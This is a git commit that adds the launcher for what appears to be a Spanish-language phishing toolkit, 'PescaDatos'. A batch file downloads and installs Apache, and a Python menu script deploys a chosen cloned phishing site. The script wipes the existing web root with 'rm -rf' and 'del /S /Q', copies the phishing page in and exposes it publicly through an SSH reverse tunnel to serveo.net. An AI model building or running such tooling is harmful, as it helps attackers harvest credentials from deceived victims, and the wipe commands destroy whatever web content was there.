073e65825dd6f895064cc2aaf912ef5580f21d6f
17biel06 <62700964+17biel06@users.noreply.github.com>
2023-10-19 21:33:04 +0200

    Add files via upload

---
+++ install_windows.bat
@@ -0,0 +1,33 @@
+@echo off
+SETLOCAL
+
+:: Cambia esto por la URL de tu archivo
+set "url=https://github.com/17biel06/PescaDatos/raw/main/Apache24.zip"
+
+:: Cambia esto por la ruta de tu archivo descargado
+set "downloaded_file=%TEMP%\Apache24.zip"
+
+:: Cambia esto por la ruta de tu carpeta descomprimida
+set "unzipped_folder=%TEMP%\Apache24"
+
+:: Descarga el archivo con curl
+powershell -Command "& {curl '%url%' -o '%downloaded_file%'}"
+
+:: Descomprime el archivo
+powershell -Command "& {Expand-Archive -Path '%downloaded_file%' -force -DestinationPath '%unzipped_folder%'}"
+
+:: Elimina la carpeta existente en C:\
+if exist "C:\Apache24" rmdir /S /Q "C:\Apache24"
+
+:: Mueve la carpeta descomprimida a C:\
+move /Y "%unzipped_folder%" "C:\"
+
+:: Entra en la carpeta bin y ejecuta el comando
+cd "C:\Apache24\bin"
+httpd -k install
+
+:: Elimina el archivo zip descargado
+del /F "%downloaded_file%"
+
+ENDLOCAL
+
---
+++ main.py
@@ -0,0 +1,82 @@
+import os
+import signal
+
+def sistema_operativo():
+    print("1) Windows")
+    print("2) Linux")
+    return int(input("Ingresa tu opción: "))
+
+sistema = sistema_operativo()
+
+try:
+    def menu(): 
+        print("1) Instalar")
+        print("2) Página de phishing")
+        print("3) Salir")
+        return int(input("Ingresa tu opción: "))
+
+    def instalar(): 
+        print("1) Windows")
+        print("2) Linux")
+        if int(input("Ingresa tu opción: ")) == 1:
+            os.system(".\\install_windows.bat")
+        else:
+            os.system("sudo apt install apache2 -y && sudo pip install -r requirments.txt")
+        main()
+
+    def menu_phishing():
+        carpetas = os.listdir('.sites')
+        for i, carpeta in enumerate(carpetas, start=1):
+            print(f"{i}) {carpeta}")
+        return carpetas[int(input("Ingresa tu opción: ")) - 1]
+
+    def inicio_phishing_windows(carpeta):
+        try:
+            os.system(f"cd .sites/{carpeta}")
+            print("Iniciando el servidor...")
+            os.system("cd C:\\Apache24\\htdocs\\")
+            os.system("del /S /Q C:\\Apache24\\htdocs\\*") 
+            os.system(f"xcopy /E /I .sites\\{carpeta}\\* C:\\Apache24\\htdocs\\")
+            os.system("NET START Apache2.4")
+
+            print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
+        except Exception as e:
+            print(f"Se produjo un error: {e}")
+
+    def inicio_phishing_linux(carpeta):
+        os.system(f"cd .sites/{carpeta}")
+        print("Iniciando el servidor...")
+        os.system("sudo rm -rf /var/www/html/*")  
+        os.system(f"sudo cp -r .sites/{carpeta} /var/www/html/")
+        os.system("sudo systemctl start apache2")
+
+    def serveo(): 
+        os.system("ssh -R 80:localhost:80 serveo.net")
+
+    def main():
+        opcion_menu = menu()
+        if opcion_menu == 1:
+            instalar()
+        elif opcion_menu == 2:
+            carpeta_elegida = menu_phishing()
+            print(f"Has elegido la carpeta {carpeta_elegida}")
+            if sistema == 1:
+                inicio_phishing_windows(carpeta_elegida)
+            else:
+                inicio_phishing_linux(carpeta_elegida)
+        else:
+            print("Saliendo del programa...")
+            if sistema == 1:
+                os.system("NET STOP Apache2.4")  
+            elif sistema == 2:  
+                os.system("sudo systemctl stop apache2")
+            
+    if __name__ == "__main__":
+        main()
+
+except KeyboardInterrupt:
+    print("\nInterrupción detectada, deteniendo el servidor Apache...")
+    if sistema == 1:
+                os.system("NET STOP Apache2.4")  
+    elif sistema == 2:  
+                os.system("sudo systemctl stop apache2")
